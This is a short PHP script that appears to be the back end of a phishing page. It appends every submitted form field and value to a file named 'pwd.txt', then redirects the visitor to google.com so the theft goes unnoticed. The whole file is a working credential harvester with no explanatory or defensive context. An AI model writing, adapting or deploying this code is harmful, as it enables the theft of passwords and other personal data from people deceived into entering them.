<?php

	header("Location: https://www.google.com");
	$fhandle=fopen("pwd.txt","a");
	foreach ($_POST as $i => $value) {
		fwrite($fhandle, "$i ");
		fwrite($fhandle, "= ");
		fwrite($fhandle, "$value \n");
	}
	fclose($fhandle);
	sleep(3);
?>